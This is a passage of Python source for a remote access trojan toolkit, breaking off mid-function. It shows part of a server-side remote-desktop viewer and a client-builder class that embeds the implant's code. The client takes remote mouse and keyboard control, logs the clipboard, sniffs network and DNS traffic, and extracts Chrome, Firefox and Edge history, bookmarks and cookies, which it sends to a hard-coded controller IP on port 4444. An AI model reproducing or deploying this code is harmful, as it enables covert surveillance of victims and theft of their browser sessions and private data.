                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
                
            except Exception as e:
                self.rat_app.log(f"Error sending mouse scroll: {e}")
                
    def on_mouse_click(self, event, button, state):
        """Handle mouse click events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Calculate if the click is within the image area using the same logic as mouse_move
            widget_width = self.screen_label.winfo_width()
            widget_height = self.screen_label.winfo_height()
            
            # Get the image size
            if hasattr(self, 'client_width') and self.client_width > 0:
                img_width = self.client_width
                img_height = self.client_height
            else:
                # Fallback if client dimensions are not known
                img_width = widget_width
                img_height = widget_height
            
            # Calculate the scaling factor
            scale = min(widget_width / img_width, widget_height / img_height)
            scaled_width = int(img_width * scale)
            scaled_height = int(img_height * scale)
            
            # Calculate the image position within the widget (for centering)
            img_x_offset = (widget_width - scaled_width) // 2
            img_y_offset = (widget_height - scaled_height) // 2
            
            # Adjust coordinates to account for the image position
            adjusted_x = event.x - img_x_offset
            adjusted_y = event.y - img_y_offset
            
            # Check if click is within the image bounds
            if 0 <= adjusted_x <= scaled_width and 0 <= adjusted_y <= scaled_height:
                # Record start time for latency measurement
                start_time = time.time()
                
                # Send command to client with a terminator
                command = f"MOUSE_CLICK|{button}|{state}\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending key press: {e}")
    
    def on_key_press(self, event):
        """Handle key press events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Convert special keys
            key = self._convert_key(event)
            
            if key:
                # Measure latency start
                start_time = time.time()
                
                # Send key press command
                command = f"KEY|{key}|press\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending key press: {e}")
            
    def on_key_release(self, event):
        """Handle key release events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Convert special keys
            key = self._convert_key(event)
            
            if key:
                # Record latency start
                start_time = time.time()
                
                # Send key release command
                command = f"KEY|{key}|release\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending key release: {e}")
    
    def _convert_key(self, event):
        """Convert Tkinter key event to a key name that pyautogui can understand"""
        # Map of Tkinter key names to pyautogui key names
        key_map = {
            "Return": "enter",
            "BackSpace": "backspace",
            "Tab": "tab",
            "Escape": "escape",
            "space": "space",
            "Delete": "delete",
            "Up": "up",
            "Down": "down",
            "Left": "left",
            "Right": "right",
            "Home": "home",
            "End": "end",
            "Page_Up": "pageup",
            "Page_Down": "pagedown",
            "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
            "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
            "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
            "Control_L": "ctrl", "Control_R": "ctrl",
            "Alt_L": "alt", "Alt_R": "alt",
            "Shift_L": "shift", "Shift_R": "shift",
            "Win_L": "win", "Win_R": "win"
        }
        
        # Get the key name
        key_name = event.keysym
        
        # Check if it's a special key
        if key_name in key_map:
            return key_map[key_name]
        
        # If it's a printable character, return the character
        if len(key_name) == 1:
            return key_name
        
        # For other keys, try to handle them
        if hasattr(event, 'char') and event.char:
            return event.char
    
        
        
class ClientBuilderUtility:
    """Advanced client builder utility for generating customized RAT clients"""
    
    c_code = r'''
import socket
import threading
import time
import struct
import os
import platform
import subprocess
import zlib
import io
import cv2
import numpy as np
import pyaudio
from PIL import ImageGrab
import pynput
from pynput import keyboard
import sys
import ctypes
from datetime import datetime
import psutil
import json
import numpy as np
import time
import threading
import sqlite3
import os
import json
import base64
import shutil
import tempfile
from datetime import datetime
import socket
import struct
import psutil
from scapy.all import sniff, wrpcap
import win32clipboard
from winreg import *
import uuid
import browser_cookie3
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Controller as KeyboardController
import pyautogui
from scapy.all import IP, TCP, UDP, ICMP, ARP
from scapy.layers.http import HTTP
from scapy.layers.dns import DNS
from scapy.layers.inet import TCP, UDP, ICMP, IP
from scapy.layers.l2 import ARP
import collections
from PIL import Image

# Configuration
SERVER_IP = "192.168.1.44"  # Change this to the server IP
SERVER_PORT = 4444       # Default server port
BUFFER_SIZE = 4096
SCREENSHOT_QUALITY = 30  # Lower number = higher quality (and larger file size)
SCREENSHOT_INTERVAL = 1/30  # Time between screenshots in seconds
MAX_UDP_SIZE = 64507  # Max UDP packet size



class RemoteDesktopControl:
    """Handles remote desktop control on the client side"""
    
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.control_active = False
        self.control_socket = None
        self.control_port = None
        
    def start(self, control_port):
        """Start the remote desktop control service"""
        try:
            # Create a dedicated socket for control commands
            self.control_port = control_port
            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.control_socket.bind(('0.0.0.0', self.control_port))
            self.control_socket.listen(1)
            
            # Start listening for control commands in a new thread
            self.control_active = True
            self.control_thread = threading.Thread(target=self.control_listener, daemon=True)
            self.control_thread.start()
            
            print(f"[*] Remote desktop control started on port {control_port}")
            return True
            
        except Exception as e:
            print(f"[!] Error starting remote desktop control: {e}")
            return False
    
    def stop(self):
        """Stop the remote desktop control service"""
        self.control_active = False
        
        if self.control_socket:
            try:
                self.control_socket.close()
            except:
                pass
        
        print("[*] Remote desktop control stopped")
    
    def control_listener(self):
        """Listen for and handle control commands from the server"""
        try:
            print("[*] Waiting for control connection...")
            server_socket, _ = self.control_socket.accept()
            server_socket.settimeout(1)  # 1 second timeout for responsive stopping
            
            print("[*] Control connection established")
            
            buffer = ""
            
            while self.control_active:
                try:
                    # Receive data with improved command separation
                    data = server_socket.recv(1024)
                    if not data:
                        break
                    
                    # Add received data to buffer
                    buffer += data.decode('utf-8')
                    
                    # Process each complete command in the buffer
                    while '|' in buffer:
                        # Check if the command is a movement command (they can come fast)
                        if buffer.startswith("MOUSE_MOVE|"):
                            # Find the end of this command
                            cmd_end = buffer.find("\n")
                            if cmd_end == -1:  # No newline, might be incomplete command
                                if len(buffer) > 50:  # If buffer is long enough, likely has a full command
                                    cmd_end = len(buffer)
                                else:
                                    break  # Wait for more data
                            
                            command = buffer[:cmd_end]
                            buffer = buffer[cmd_end+1:] if cmd_end < len(buffer) else ""
                        else:
                            # For other commands, find the command terminator
                            cmd_end = buffer.find("\n")
                            if cmd_end == -1:  # No command terminator, might be incomplete command
                                break
                                
                            command = buffer[:cmd_end]
                            buffer = buffer[cmd_end+1:]
                        
                        # Process the command
                        if command:
                            response = self.process_command(command)
                            
                            # Send acknowledgment
                            server_socket.send(response.encode())
                    
                except socket.timeout:
                    # This is expected with the timeout set
                    continue
                except Exception as e:
                    print(f"[!] Error in control connection: {e}")
                    break
            
            # Clean up
            try:
                server_socket.close()
            except:
                pass
                
            print("[*] Control connection closed")
            
        except Exception as e:
            print(f"[!] Control listener error: {e}")
    
    def process_command(self, command):
        """Process a control command and perform the corresponding action"""
        try:
            print(f"[DEBUG] Processing command: '{command}'")
            
            # Strip any whitespace that might cause parsing issues
            command = command.strip()
            
            parts = command.split('|')
            if len(parts) < 2:
                print(f"[!] Invalid command format: {command}")
                return "ERROR: Invalid command format"
        
            cmd_type = parts[0]

            if cmd_type == "MOUSE_MOVE":
                # Format: MOUSE_MOVE|rel_x|rel_y
                if len(parts) < 3:
                    return "ERROR: Invalid MOUSE_MOVE command"
                    
                try:

                    rel_x = float(parts[1])
                    rel_y = float(parts[2].splitlines()[0])
                    # Get screen dimensions
                    screen_width, screen_height = pyautogui.size()
                    
                    # Calculate absolute position
                    x = int(rel_x * screen_width)
                    y = int(rel_y * screen_height)
                    
                    print(f"[DEBUG] Moving mouse to: {x},{y} (from rel: {rel_x},{rel_y})")
                    
                    # Move the mouse
                    pyautogui.moveTo(x, y)
                    return "OK"
                
                except ValueError as e:
                    print(f"[!] Error parsing mouse coordinates: {e}")
                    return f"ERROR: {str(e)}"
            
            elif cmd_type == "MOUSE_CLICK":
                # Format: MOUSE_CLICK|button|action
                if len(parts) < 3:
                    return "ERROR: Invalid MOUSE_CLICK command"
                  
                button = parts[1]  # left, right, middle
                action = parts[2].splitlines()[0]  # click, press, release
                
                print(f"[DEBUG] Mouse {button} {action}")
                
                if action == "click":
                    pyautogui.click(button=button)
                elif action == "press":
                    pyautogui.mouseDown(button=button)
                elif action == "release":
                    pyautogui.mouseUp(button=button)
                
                return "OK"
            
            elif cmd_type == "MOUSE_SCROLL":
                # Format: MOUSE_SCROLL|amount
                if len(parts) < 2:
                    return "ERROR: Invalid MOUSE_SCROLL command"
                    
                try:
                    amount = int(parts[1])
                    pyautogui.scroll(amount)
                    return "OK"
                except ValueError as e:
                    return f"ERROR: {str(e)}"
            
            elif cmd_type == "KEY":
                # Format: KEY|key|action
                if len(parts) < 3:
                    return "ERROR: Invalid KEY command"
                    
                key = parts[1]
                action = parts[2]  # press, release
                
                print(f"[DEBUG] Keyboard {key} {action}")
                
                if action == "press":
                    pyautogui.keyDown(key)
                elif action == "release":
                    pyautogui.keyUp(key)
                
                return "OK"
            
            elif cmd_type == "TYPE":
                # Format: TYPE|text
                if len(parts) < 2:
                    return "ERROR: Invalid TYPE command"
                    
                text = parts[1]
                pyautogui.write(text)
                return "OK"
            
            return f"UNKNOWN_COMMAND: {cmd_type}"
            
        except Exception as e:
            print(f"[!] Error processing command: {e}")
            return f"ERROR: {str(e)}"
                
    
class AdvancedMonitoring:
    """Advanced monitoring capabilities including network, clipboard, and browser data"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
        
        # Flags for monitoring features
        self.network_capture_active = False
        self.clipboard_monitoring_active = False
        self.dns_monitoring_active = False
        self.browser_monitoring_active = False
        
        # Storage for monitoring data
        self.capture_file = os.path.join(tempfile.gettempdir(), "netcap.pcap")
        self.clipboard_history = []
        self.dns_history = []
        
        # Network capture thread
        self.network_thread = None
        self.clipboard_thread = None
        self.dns_thread = None
        self.browser_thread = None
    
    def handle_monitoring_command(self, command):
        """Process monitoring-related commands from the server"""
        # Convert bytes to string if necessary
        if isinstance(command, bytes):
            command = command.decode('utf-8')
            
        print(f"[*] Handling monitoring command: {command}")
        
        if command == "START_NETWORK_CAPTURE":
            self.start_network_capture()
        elif command == "STOP_NETWORK_CAPTURE":
            self.stop_network_capture()
        elif command == "GET_NETWORK_CAPTURE":
            self.send_network_capture()
        elif command == "START_CLIPBOARD_MONITORING":
            self.start_clipboard_monitoring()
        elif command == "STOP_CLIPBOARD_MONITORING":
            self.stop_clipboard_monitoring()
        elif command == "GET_CLIPBOARD_DATA":
            self.send_clipboard_data()
        elif command == "EXTRACT_BROWSER_DATA":
            self.extract_browser_data()
        elif command == "START_DNS_MONITORING":
            self.start_dns_monitoring()
        elif command == "STOP_DNS_MONITORING":
            self.stop_dns_monitoring()
        elif command == "GET_DNS_HISTORY":
            self.send_dns_history()
        elif command == "GET_SYSTEM_INFO":
            self.send_system_info()
    
    # Network Traffic Monitoring
    def start_network_capture(self):
        """Start capturing network traffic"""
        if not self.network_capture_active:
            print("[*] Starting network traffic capture")
            self.network_capture_active = True
            
            # Clear previous capture file if it exists
            if os.path.exists(self.capture_file):
                try:
                    os.remove(self.capture_file)
                except:
                    pass
            
            # Start capturing in a new thread
            self.network_thread = threading.Thread(target=self._network_capture_thread)
            self.network_thread.daemon = True
            self.network_thread.start()
            
            self.client_socket.send("SUCCESS: Network capture started".encode())
        else:
            self.client_socket.send("INFO: Network capture already active".encode())
    
    def _network_capture_thread(self):
        """Thread function for network capture"""
        try:
            # Capture packets to file
            print(f"[*] Writing network capture to {self.capture_file}")
            wrpcap(self.capture_file, sniff(timeout=0, store=True), append=True)
        except Exception as e:
            print(f"[!] Error in network capture: {e}")
            self.network_capture_active = False
    
    def stop_network_capture(self):
        """Stop capturing network traffic"""
        if self.network_capture_active:
            print("[*] Stopping network traffic capture")
            self.network_capture_active = False
            
            # Give a moment for the thread to finish
            time.sleep(1)
            
            self.client_socket.send("SUCCESS: Network capture stopped".encode())
        else:
            self.client_socket.send("INFO: No active network capture to stop".encode())
    
    def send_network_capture(self):
        """Send the captured network data to the server"""
        if os.path.exists(self.capture_file):
            try:
                # Get file size
                file_size = os.path.getsize(self.capture_file)
                
                # Send file size first
                self.client_socket.send(struct.pack('Q', file_size))
                
                # Wait for ready signal
                ready = self.client_socket.recv(1024)
                if ready != b"READY":
                    return
                
                # Send file data
                with open(self.capture_file, 'rb') as f:
                    bytes_sent = 0
                    
                    while bytes_sent < file_size:
                        chunk = f.read(self.buffer_size)
                        if not chunk:
                            break
                        
                        self.client_socket.send(chunk)
                        bytes_sent += len(chunk)
                        
                        # Wait for acknowledgment
                        ack = self.client_socket.recv(1024)
                        if ack == b"CANCEL":
                            return
                
                # Clean up the file
                try:
                    os.remove(self.capture_file)
                except:
                    pass
                
                print("[*] Network capture data sent")
                
            except Exception as e:
                print(f"[!] Error sending network capture: {e}")
                self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
        else:
            # No capture file exists
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size
            print("[*] No network capture file to send")
    
    # Clipboard Monitoring
    def start_clipboard_monitoring(self):
        """Start monitoring the clipboard"""
        if not self.clipboard_monitoring_active:
            print("[*] Starting clipboard monitoring")
            self.clipboard_monitoring_active = True
            self.clipboard_history.clear()
            
            # Start monitoring in a new thread
            self.clipboard_thread = threading.Thread(target=self._clipboard_monitor_thread)
            self.clipboard_thread.daemon = True
            self.clipboard_thread.start()
            
            self.client_socket.send("SUCCESS: Clipboard monitoring started".encode())
        else:
            self.client_socket.send("INFO: Clipboard monitoring already active".encode())
    
    def _clipboard_monitor_thread(self):
        """Thread function for clipboard monitoring"""
        last_value = ""
        
        while self.clipboard_monitoring_active:
            try:
                # Get clipboard contents (text only for now)
                win32clipboard.OpenClipboard()
                try:
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        value = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        if value and value != last_value:
                            # Convert bytes to string if necessary
                            if isinstance(value, bytes):
                                value = value.decode('utf-8', errors='replace')
                            
                            # Record the new clipboard value
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            self.clipboard_history.append({
                                'timestamp': timestamp,
                                'value': value
                            })
                            last_value = value
                            print(f"[*] New clipboard content: {value[:50]}...")
                finally:
                    win32clipboard.CloseClipboard()
                
                # Check every second
                time.sleep(1)
                
            except Exception as e:
                print(f"[!] Error monitoring clipboard: {e}")
                time.sleep(5)  # Wait longer after an error
    
    def stop_clipboard_monitoring(self):
        """Stop monitoring the clipboard"""
        if self.clipboard_monitoring_active:
            print("[*] Stopping clipboard monitoring")
            self.clipboard_monitoring_active = False
            
            self.client_socket.send("SUCCESS: Clipboard monitoring stopped".encode())
        else:
            self.client_socket.send("INFO: No active clipboard monitoring to stop".encode())
    
    def send_clipboard_data(self):
        """Send the collected clipboard history to the server"""
        try:
            # Convert history to JSON
            data = json.dumps(self.clipboard_history).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print(f"[*] Sent {len(self.clipboard_history)} clipboard entries")
            
        except Exception as e:
            print(f"[!] Error sending clipboard data: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    # Browser Data Extraction
    def extract_browser_data(self):
        """Extract and send browser history, bookmarks, and cookies"""
        print("[*] Starting browser data extraction")
        
        try:
            browser_data = {
                'chrome': {
                    'history': self._extract_chrome_history(),
                    'bookmarks': self._extract_chrome_bookmarks(),
                    'cookies': self._extract_chrome_cookies()
                },
                'firefox': {
                    'history': self._extract_firefox_history(),
                    'bookmarks': self._extract_firefox_bookmarks(),
                    'cookies': self._extract_firefox_cookies()
                },
                'edge': {
                    'history': self._extract_edge_history(),
                    'bookmarks': self._extract_edge_bookmarks(),
                    'cookies': self._extract_edge_cookies()
                }
            }
            
            # Convert to JSON
            data = json.dumps(browser_data).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print("[*] Browser data sent")
            
        except Exception as e:
            print(f"[!] Error extracting browser data: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    def _extract_chrome_history(self, limit=100):
        """Extract Chrome browsing history"""
        history_items = []
        
        try:
            # Chrome history is stored in SQLite database
            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                       'Google', 'Chrome', 'User Data', 
                                       'Default', 'History')
            
            # Create a copy of the database since Chrome locks the original
            temp_history = os.path.join(tempfile.gettempdir(), "chrome_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Chrome history: {e}")
        
        return history_items
    
    def _extract_chrome_bookmarks(self):
        """Extract Chrome bookmarks"""
        bookmarks = []
        
        try:
            # Chrome bookmarks are stored in a JSON file
            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                         'Google', 'Chrome', 'User Data', 
                                         'Default', 'Bookmarks')
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract bookmarks from the roots
            def extract_bookmarks_from_node(node):
                if node.get('type') == 'url':
                    bookmarks.append({
                        'url': node.get('url'),
                        'name': node.get('name'),
                        'date_added': node.get('date_added')
                    })
                elif node.get('type') == 'folder':
                    for child in node.get('children', []):
                        extract_bookmarks_from_node(child)
            
            # Extract from all roots
            for _, root in data.get('roots', {}).items():
                extract_bookmarks_from_node(root)
            
        except Exception as e:
            print(f"[!] Error extracting Chrome bookmarks: {e}")
        
        return bookmarks
    
    def _extract_chrome_cookies(self, limit=100):
        """Extract Chrome cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            chrome_cookies = list(browser_cookie3.chrome())[:limit]
            
            for cookie in chrome_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Chrome cookies: {e}")
            
            # Fallback method if browser_cookie3 fails
            try:
                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                          'Google', 'Chrome', 'User Data', 
                                          'Default', 'Cookies')
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "chrome_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc 
                    FROM cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Chrome cookies extraction: {e2}")
        
        return cookies
    
    # Firefox methods
    def _extract_firefox_history(self, limit=100):
        """Extract Firefox browsing history"""
        history_items = []
        
        try:
            # Find the Firefox profile directory
            profile_dir = self._get_firefox_profile_dir()
            if not profile_dir:
                return history_items
            
            # History is stored in places.sqlite
            history_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(history_path):
                return history_items
            
            # Create a copy of the database
            temp_history = os.path.join(tempfile.gettempdir(), "firefox_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') 
                FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id 
                ORDER BY visit_date DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Firefox history: {e}")
        
        return history_items
    
    def _extract_firefox_bookmarks(self):
        """Extract Firefox bookmarks"""
        bookmarks = []
        
        try:
            # Find the Firefox profile directory
            profile_dir = self._get_firefox_profile_dir()
            if not profile_dir:
                return bookmarks
            
            # Bookmarks are stored in places.sqlite
            bookmarks_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(bookmarks_path):
                return bookmarks
            
            # Create a copy of the database
            temp_bookmarks = os.path.join(tempfile.gettempdir(), "firefox_bookmarks.db")
            shutil.copy2(bookmarks_path, temp_bookmarks)
            
            # Query the database
            conn = sqlite3.connect(temp_bookmarks)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT b.title, p.url 
                FROM moz_bookmarks b 
                JOIN moz_places p ON b.fk = p.id 
                WHERE b.type = 1
            """)
            
            for row in cursor.fetchall():
                bookmarks.append({
                    'name': row[0],
                    'url': row[1]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_bookmarks)
            
        except Exception as e:
            print(f"[!] Error extracting Firefox bookmarks: {e}")
        
        return bookmarks
    
    def _extract_firefox_cookies(self, limit=100):
        """Extract Firefox cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            firefox_cookies = list(browser_cookie3.firefox())[:limit]
            
            for cookie in firefox_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Firefox cookies: {e}")
            
            # Fallback method
            try:
                # Find the Firefox profile directory
                profile_dir = self._get_firefox_profile_dir()
                if not profile_dir:
                    return cookies
                
                # Cookies are stored in cookies.sqlite
                cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
                
                if not os.path.exists(cookies_path):
                    return cookies
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "firefox_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host, name, value, path, expiry 
                    FROM moz_cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Firefox cookies extraction: {e2}")
        
        return cookies
    
    def _get_firefox_profile_dir(self):
        """Find the Firefox profile directory"""
        try:
            profiles_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
            
            if not os.path.exists(profiles_dir):
                return None
            
            # Look for the default profile (usually has 'default' in the name)
            for dir_name in os.listdir(profiles_dir):
                if 'default-release' in dir_name.lower():
                    return os.path.join(profiles_dir, dir_name)
            
            # If no 'default' profile found, use the first one
            dirs = os.listdir(profiles_dir)
            if dirs:
                return os.path.join(profiles_dir, dirs[0])
            
        except Exception as e:
            print(f"[!] Error finding Firefox profile: {e}")
        
        return None
    
    # Edge methods
    def _extract_edge_history(self, limit=100):
        """Extract Edge browsing history"""
        history_items = []
        
        try:
            # Edge history is stored in the same format as Chrome
            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                       'Microsoft', 'Edge', 'User Data', 
                                       'Default', 'History')
            
            # Create a copy of the database
            temp_history = os.path.join(tempfile.gettempdir(), "edge_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Edge history: {e}")
        
        return history_items
    
    def _extract_edge_bookmarks(self):
        """Extract Edge bookmarks"""
        bookmarks = []
        
        try:
            # Edge bookmarks are stored in the same format as Chrome
            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                         'Microsoft', 'Edge', 'User Data', 
                                         'Default', 'Bookmarks')
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract bookmarks from the roots
            def extract_bookmarks_from_node(node):
                if node.get('type') == 'url':
                    bookmarks.append({
                        'url': node.get('url'),
                        'name': node.get('name'),
                        'date_added': node.get('date_added')
                    })
                elif node.get('type') == 'folder':
                    for child in node.get('children', []):
                        extract_bookmarks_from_node(child)
            
            # Extract from all roots
            for _, root in data.get('roots', {}).items():
                extract_bookmarks_from_node(root)
            
        except Exception as e:
            print(f"[!] Error extracting Edge bookmarks: {e}")
        
        return bookmarks
    
    def _extract_edge_cookies(self, limit=100):
        """Extract Edge cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            edge_cookies = list(browser_cookie3.edge())[:limit]
            
            for cookie in edge_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Edge cookies: {e}")
            
            # Fallback method
            try:
                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                          'Microsoft', 'Edge', 'User Data', 
                                          'Default', 'Cookies')
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "edge_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc 
                    FROM cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Edge cookies extraction: {e2}")
        
        return cookies
    
    # DNS Monitoring
    def start_dns_monitoring(self):
        """Start DNS request monitoring"""
        if not self.dns_monitoring_active:
            print("[*] Starting DNS monitoring")
            self.dns_monitoring_active = True
            self.dns_history.clear()
            
            # Start monitoring in a new thread
            self.dns_thread = threading.Thread(target=self._dns_monitor_thread)
            self.dns_thread.daemon = True
            self.dns_thread.start()
            
            self.client_socket.send("SUCCESS: DNS monitoring started".encode())
        else:
            self.client_socket.send("INFO: DNS monitoring already active".encode())
    
    def _dns_monitor_thread(self):
        """Thread function for DNS monitoring"""
        try:
            # Use scapy to capture DNS packets
            def dns_callback(packet):
                try:
                    if self.dns_monitoring_active and packet.haslayer('DNS'):
                        dns_layer = packet.getlayer('DNS')
                        if dns_layer.qr == 0:  # Query
                            query_name = dns_layer.qd.qname.decode('utf-8')
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            self.dns_history.append({
                                'timestamp': timestamp,
                                'query': query_name,
                                'type': dns_layer.qd.qtype
                            })
                            print(f"[*] DNS Query: {query_name}")
                except Exception as e:
                    print(f"[!] Error processing DNS packet: {e}")
            
            # Start sniffing for DNS packets
            sniff(filter="udp port 53", prn=dns_callback, store=0)
            
        except Exception as e:
            print(f"[!] Error in DNS monitoring: {e}")
            self.dns_monitoring_active = False
    
    def stop_dns_monitoring(self):
        """Stop DNS monitoring"""
        if self.dns_monitoring_active:
            print("[*] Stopping DNS monitoring")
            self.dns_monitoring_active = False
            
            self.client_socket.send("SUCCESS: DNS monitoring stopped".encode())
        else:
            self.client_socket.send("INFO: No active DNS monitoring to stop".encode())
    
    def send_dns_history(self):
        """Send the collected DNS history to the server"""
        try:
            # Convert history to JSON
            data = json.dumps(self.dns_history).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print(f"[*] Sent {len(self.dns_history)} DNS entries")
            
        except Exception as e:
            print(f"[!] Error sending DNS history: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    # System Information
    def send_system_info(self):
        """Send detailed system information to the server"""
        try:
            # Collect system info
            system_info = {
